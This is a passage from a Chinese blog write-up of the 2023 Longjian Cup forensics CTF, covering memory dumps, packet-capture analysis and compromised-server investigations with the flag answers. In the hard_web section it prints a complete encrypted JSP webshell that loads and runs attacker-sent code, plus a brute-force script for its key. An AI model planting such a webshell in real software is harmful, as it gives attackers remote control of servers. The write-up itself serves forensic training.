<br>0x000000003e45f460 vmacthlp.exe        708    520 0x0000000018550000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e47e5f0 svchost.exe         752    520 0x0000000017ad6000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e4bb740 svchost.exe         840    520 0x0000000017ce9000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e4e4b30 svchost.exe         884    520 0x00000000172f0000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e4edb30 svchost.exe         908    520 0x000000001723e000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e566830 svchost.exe         368    520 0x00000000164c5000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e59eb30 svchost.exe         988    520 0x0000000015dce000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e733b30 msdtc.exe          2092    520 0x000000003b51a000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e75d510 wininit.exe         412    344 0x000000001acc3000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003e768460 csrss.exe           420    404 0x000000001ac8a000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003e798b30 winlogon.exe        468    404 0x000000001a390000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003e7ba7c0 services.exe        520    412 0x0000000018e7b000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e7c4b30 lsass.exe           536    412 0x0000000018da3000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e7cb7b0 lsm.exe             544    412 0x000000001906b000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003ee32530 dllhost.exe        3420    644 0x0000000024b7a000 2022-05-29 12:14:17 UTC+0000                                 <br>0x000000003ee8d590 DumpIt.exe         3212   2552 0x0000000001cdf000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003ee92060 conhost.exe        3236    420 0x0000000012664000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003ef11790 dllhost.exe        2488    644 0x0000000001f1a000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003efa76f0 dllhost.exe        2836    644 0x0000000037d5a000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003efd0790 dllhost.exe        2488    644 0x0000000001f1a000 2022-05-29 12:14:13 UTC+0000                                 <br>0x000000003f1ab060 dllhost.exe        3364    644 0x0000000032a08000 2022-05-29 12:13:10 UTC+0000                                 <br>0x000000003f1adb30 SearchFilterHo     3936   2884 0x000000000ec8c000 2022-05-29 12:14:00 UTC+0000                                 <br>0x000000003f1e0060 taskhost.exe       3244    520 0x0000000020df5000 2022-05-29 12:13:06 UTC+0000                                 <br>0x000000003f1e9060 iexplore.exe       3532   3480 0x0000000025a35000 2022-05-29 12:13:21 UTC+0000                                 <br>0x000000003f1f6b30 SearchProtocol     3916   2884 0x000000001b2e9000 2022-05-29 12:14:00 UTC+0000                                 <br>0x000000003f2e7780 iexplore.exe       3480   2552 0x00000000115d5000 2022-05-29 12:13:21 UTC+0000                                 <br>0x000000003f5a6b30 csrss.exe           360    344 0x000000001b6bd000 2022-04-14 11:14:00 UTC+0000                                 <br>0x000000003f5af6f0 audiodg.exe        1276    840 0x0000000039805000 2022-05-29 12:07:28 UTC+0000                                 <br>0x000000003f5fb650 smss.exe            268      4 0x00000000204fc000 2022-04-14 11:13:59 UTC+0000                                 <br>0x000000003fe39060 iexplore.exe       3824   3480 0x0000000014820000 2022-05-29 12:13:59 UTC+0000                                 <br>0x000000003ff40b30 System                4      0 0x0000000000187000 2022-04-14 11:13:59 UTC+0000                                 <br>                                                                                                                                                              <br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 memdump -p 2844 -D /tmp</span><br>Volatility Foundation Volatility Framework 2.6.1<br>************************************************************************<br>Writing calc.exe [  2844] to 2844.dmp<br></code></pre></td></tr></table></figure>

<p>将后缀改成data，然后用gimp查看data</p>
<p><img src="/img/blogimg/1706703063960-74f4498a-259f-44f3-995b-bf41b79996c1.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>该内存文件中存在的flag值是多少？<br>flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}</p>
</blockquote>
<h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>导出StikyNot.exe，将后缀改成data，然后用gimp查看data</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 memdump -p 2968 -D /tmp</span><br>Volatility Foundation Volatility Framework 2.6.1<br>************************************************************************<br>Writing StikyNot.exe [  2968] to 2968.dmp<br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703086415-03113fcc-53e5-4425-96f3-575373f24361.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706703095127-99e72356-e47f-4a8e-a71c-9c67c6197040.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><p>将raw文件直接用010打开，然后可以发现疑似密文的东西</p>
<p><img src="/img/blogimg/1706703104975-b81f6cca-f21c-43b8-8a68-e0d903898cb9.png" srcset="/img/loading.gif" lazyload></p>
<p>疑似密码，用aes解密</p>
<p><img src="/img/blogimg/1706703127789-89b5a477-3b81-4fa1-a6c0-5ac699af868b.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706703131576-01e40753-46ca-4077-b838-7de139778185.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h3><blockquote>
<p>服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)<br>80,888,8888</p>
</blockquote>
<p>统计→会话可以发现存在端口扫描行为</p>
<p><img src="/img/blogimg/1706703834124-8259ba3f-abf1-44dc-8166-e7a8143642f2.png" srcset="/img/loading.gif" lazyload></p>
<p> 可以发现80,888,,8888三个端口</p>
<p><img src="/img/blogimg/1706702419897-49846437-f65c-48a8-ae68-7db6ba165597.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.connection.synack and ip.dst<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">192.168</span>.<span class="hljs-number">162.180</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>服务器中根目录下的flag值是多少？<br>flag{9236b29d-5488-41e6-a04b-53b0d8276542}</p>
</blockquote>
<p>网站本身就存在的木马test.jsp</p>
<p><img src="/img/blogimg/1706702448265-9bc36267-9762-4230-8b5f-70b92f65398f.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;<br></code></pre></td></tr></table></figure>

<p>解密POST的jsp数据</p>
<p><img src="/img/blogimg/1706702481879-a8a2cf32-fc78-4f54-a6e1-3f0327c3c75b.png" srcset="/img/loading.gif" lazyload></p>
<p>找到最后一个shell.jsp的包，解密即可</p>
<p><img src="/img/blogimg/1706702488479-9d12efb0-7d36-4b77-af48-1e710b2e618c.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>该webshell的连接密码是多少？<br>14mk3y</p>
</blockquote>
<p>找到倒数第三个jsp流量包，解密发现需要爆破密码</p>
<p><img src="/img/blogimg/1706702499328-b791fae3-15b8-4d4a-bb02-ad573ee47971.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5</span>(<span class="hljs-params">input_string</span>):<br>    md5 = hashlib.md5()<br>    md5.update(input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br>s = string.ascii_letters + string.digits + string.punctuation<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> s:<br>                <span class="hljs-built_in">input</span> = <span class="hljs-string">&#x27;1&#x27;</span> + a + b + c + d + <span class="hljs-string">&#x27;y&#x27;</span><br>                <span class="hljs-keyword">if</span> generate_md5(<span class="hljs-built_in">input</span>)[:<span class="hljs-number">16</span>]  == <span class="hljs-string">&#x27;748007e861908c03&#x27;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">input</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706702515749-443a37e2-2693-41d0-935e-256a3d967e83.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="sevrer-save"><a href="#sevrer-save" class="headerlink" title="sevrer save"></a>sevrer save</h3><blockquote>
<p>黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514<br>本题附件见于平台公告的SS.zip，解压密码为c77ad47ba4c85fae66f08ec12e0085dd<br>CVE-2022-22965</p>
</blockquote>
<p><img src="/img/blogimg/1706702542826-5303883b-789f-45d3-b792-a0fc003f1be0.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702547317-7b064922-810c-44a1-be6a-64cb0e81c2a2.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444<br>192.168.43.128:2333</p>
</blockquote>
<p><img src="/img/blogimg/1706702560197-d33954ed-7069-4104-a063-0f0007006005.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>黑客的病毒名称是什么？ 格式为：filename<br>main</p>
</blockquote>
<p>&#x2F;home&#x2F;guests目录下面发现可疑文件</p>
<p><img src="/img/blogimg/1706702574008-ae77f0d4-24dd-4704-a775-bb0002e4a8a8.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password<br>ll:123456</p>
</blockquote>
<p>查看&#x2F;etc&#x2F;shadow文件</p>
<p><img src="/img/blogimg/1706702582745-b2a8f38d-2c78-4db7-b4e9-9361fc974543.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>服务器在被入侵时外网ip是多少? 格式为：10.10.0.1<br>172.105.202.239</p>
</blockquote>
<p>查看log.txt</p>
<p><img src="/img/blogimg/1706702590445-624fa4d5-5ecf-4d75-aba1-dde22d8a3de3.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>病毒运行后释放了什么文件？格式：文件1,文件2<br>lolMiner,mine_doge.sh</p>
</blockquote>
<p>.idea为main病毒释放的文件</p>
<p><img src="/img/blogimg/1706702606340-072ceb17-ed3c-4842-8f76-c86898040c1d.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>矿池地址是什么？ 格式：domain:1234<br>doge.millpools.cc:5567</p>
</blockquote>
<p>查看sh文件，可以发现矿池地址和钱包地址</p>
<p><img src="/img/blogimg/1706702613793-472fe8bb-4dd6-4502-bcab-a697737cc1ce.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>黑客的钱包地址是多少？格式：xx:xxxxxxxx<br>DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9</p>
</blockquote>
<h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><blockquote>
<p>被入侵主机的IP是？<br>192.168.246.28</p>
</blockquote>
<p><img src="/img/blogimg/1706702630964-bc6a7be9-1814-414d-803c-17a89d8694ad.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>被入侵主机的口令是？<br>youcannevergetthis</p>
</blockquote>
<p><img src="/img/blogimg/1706702640527-57ad9ae6-d624-4469-81f6-0726219f4d5d.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>用户目录下第二个文件夹的名称是？<br>Downloads</p>
</blockquote>
<p><img src="/img/blogimg/1706702646964-eceb4f26-62fe-4c44-b0e9-5625ec702c9e.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>&#x2F;etc&#x2F;passwd中倒数第二个用户的用户名是？<br>mysql</p>
</blockquote>
<p><img src="/img/blogimg/1706702653879-87ff98c8-5fd8-4d10-9f74-3dbde04fdbec.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h3><blockquote>
<p>连接蚁剑的正确密码是__?（答案示例：123asd）<br>6ea280898e404bfabd0ebb702327b19f</p>
</blockquote>
<p><img src="/img/blogimg/1706702833953-c34a3ce7-2d43-4227-b4f1-8668bfb73e14.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者留存的值是__?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)<br>ad6269b7-3ce2-4ae8-b97f-f259515e7a91</p>
</blockquote>
<p><img src="/img/blogimg/1706702843484-85d4ebb0-ba6d-4244-80d4-e35267989656.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702847668-89d66c34-bbd6-48af-8eb8-05a1fb875994.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者下载到的flag是__?(答案示例：flag3{uuid})<br>flag{8f0dffac-5801-44a9-bd49-e66192ce4f57}</p>
</blockquote>
<p><img src="/img/blogimg/1706702855620-005b1c4e-5b9b-4fcd-b7c3-a46fcd60cb25.png" srcset="/img/loading.gif" lazyload></p>
<p>文件-&gt;导出对象-&gt;http-&gt;Save All-&gt;保存到文件夹中，info(12)有5m，是上面的exe文件对应的流量，拖入010editor</p>
<p><img src="/img/blogimg/1706702874392-72852096-7358-4291-bfd7-d24657e9743e.png" srcset="/img/loading.gif" lazyload></p>
<p>从第三位开始是<code>4D5A90</code>是<code>EXE</code>文件的头部信息特征,所以我们删除前面三个,将其另存为<code>exe</code>执行</p>
<p><img src="/img/blogimg/1706702880040-45d10690-d637-4c11-996c-37e3a18b9d16.png" srcset="/img/loading.gif" lazyload></p>
<p>看别人的wp写运行之后会生成图片，我的不行，放到微步的沙箱可以生成</p>
<p><img src="/img/blogimg/1706702886594-bda6ea38-c34e-4209-8e21-f2fca61af104.png" srcset="/img/loading.gif" lazyload></p>
<p>爆破宽高</p>
<p><img src="/img/blogimg/1706702897671-69f3b436-cf11-47e2-a385-c0ccd67650a1.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702905758-986ecb5b-e4b4-4303-9168-a99960b98fb9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702910734-f3d481de-efaf-43ce-a609-992b2efd07db.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702919743-6d3c40a5-5295-4982-9b98-4dae674825f2.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h3><blockquote>
<p>服务器自带的后门文件名是什么？（含文件后缀）<br>ViewMore.php</p>
</blockquote>
<p><img src="/img/blogimg/1706702934817-d45d1558-817d-416a-9510-24dfdf33e40d.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>服务器的内网IP是多少？<br>192.168.101.132</p>
</blockquote>
<p><img src="/img/blogimg/1706702943361-1652ce9e-baf5-4081-b0dc-77951dd500b6.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者往服务器中写入的key是什么？<br>7d9ddff2-2d67-4eba-9e48-b91c26c42337</p>
</blockquote>
<p><img src="/img/blogimg/1706702952034-38bf593d-97df-493b-8bd0-d3a178786ca9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702957565-9765a518-f267-4d8f-9ef5-3b557a02bcb5.png" srcset="/img/loading.gif" lazyload></p>
<p>是一个压缩包</p>
<p><img src="/img/blogimg/1706702974564-a746e058-cf60-43d7-a9a2-f7510acc86ab.png" srcset="/img/loading.gif" lazyload></p>
<p>提取压缩包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> UEsDBBQAAQAAANgDvlTRoSUSMAAAACQAAAAHAAAAa2V5LnR4dGYJZVtgRzdJtOnW1ycl/O/AJ0rmzwNXxqbCRUq2LQid0gO2yXaPBcc9baLIAwnQ71BLAQI/ABQAAQAAANgDvlTRoSUSMAAAACQAAAAHACQAAAAAAAAAIAAAAAAAAABrZXkudHh0CgAgAAAAAAABABgAOg7Zcnlz2AE6DtlyeXPYAfldXhh5c9gBUEsFBgAAAAABAAEAWQAAAFUAAAAAAA== | <span class="hljs-built_in">base64</span> -d &gt; a.zip<br></code></pre></td></tr></table></figure>

<p>结合前面的密码</p>
<p><img src="/img/blogimg/1706702994529-9830f75f-7b7f-4ef0-ae9f-7ae38b8bf1b4.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702999654-0f01fa01-42cf-4599-a669-b88426924dab.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><blockquote>
<p>攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:admin<br>TMjpxFGQwD:123457</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http &amp;&amp; !http.request.uri contains &quot;login&quot; &amp;&amp; !tcp contains &quot;用户名或密码错误&quot; &amp;&amp; http.response.code !=404<br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703144845-1483be00-b33e-4a6e-b5c1-f857dc9e49cd.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）<br>383c74db4e32513daaa1eeb1726d7255</p>
</blockquote>
<p>成功之后的Cookie有<code>accessToken</code>特征，所以搜<code>accessToken</code>，<code>http contains &quot;accessToken&quot;</code></p>
<p><img src="/img/blogimg/1706703154714-67ec0da2-6acb-444d-8558-cb383c1d2a1a.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706703175025-b0fc873b-b1e2-4113-a11c-00ef50f58d6e.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456<br>zyplayer:1234567</p>
</blockquote>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tcp <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;jdbc:&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703197592-7d959f7e-4ab3-485d-b190-8a8f634915d6.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.so<br>CVE-2022-21724:custom.dtd.xml</p>
</blockquote>
<p><img src="/img/blogimg/1706703204743-8148a087-7d28-4109-ba6e-babebcc2f383.png" srcset="/img/loading.gif" lazyload></p>
<p>复现的文章里面上传了一个xml文件，搜索xml</p>
<p><img src="/img/blogimg/1706703210817-ada8bc00-c5e1-422b-a882-020d33a4f28f.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>给出攻击者获取系统权限后，下载的工具的名称，比如nmap<br>fscan</p>
</blockquote>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.port <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703225661-023e8bc8-6ada-4a8c-957d-27f1837be577.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h3><blockquote>
<p>admIn用户的密码是什么？<br>flag{WelC0m5_TO_H3re}</p>
</blockquote>
<p>比较前面的数据包可以发现key和iv</p>
<p><img src="/img/blogimg/1706703244498-19ec00df-bdab-4316-b5ce-90ca52d7bcb0.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706703252303-8b339ef9-732e-44f0-9968-19c57f1ac293.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>app.config[‘SECRET_KEY’]值为多少？<br>ssti_flask_hsfvaldb</p>
</blockquote>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tcp <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;KEY&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703259335-89e9d386-0df3-4200-b6da-9451f6a05450.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>flask网站由哪个用户启动？<br>red</p>
</blockquote>
<p>通过session进行的rce</p>
<p><img src="/img/blogimg/1706703275522-526b7853-41ec-474d-bb5a-f3b31eb1cca7.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者写入的内存马的路由名叫什么？（答案里不需要加&#x2F;）<br>Index</p>
</blockquote>
<p>翻来翻去只有Index这个路由比较可疑，拿去解密之后也证实是这个路由</p>
<p><img src="/img/blogimg/1706703281489-091416f8-08e8-478d-90d2-b883921a4170.png" srcset="/img/loading.gif" lazyload></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">#流量分析</a>
      
        <a href="/tags/%E5%8F%96%E8%AF%81/">#取证</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2023陇剑杯</div>
      <div>https://cvbxy.github.io/2024/06/20/2023陇剑杯/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>cvbxy</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/" title="春秋云镜-Initial">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">春秋云镜-Initial</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/19/FIC/" title="第四届FIC取证竞赛">
                        <span class="hidden-mobile">第四届FIC取证竞赛</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
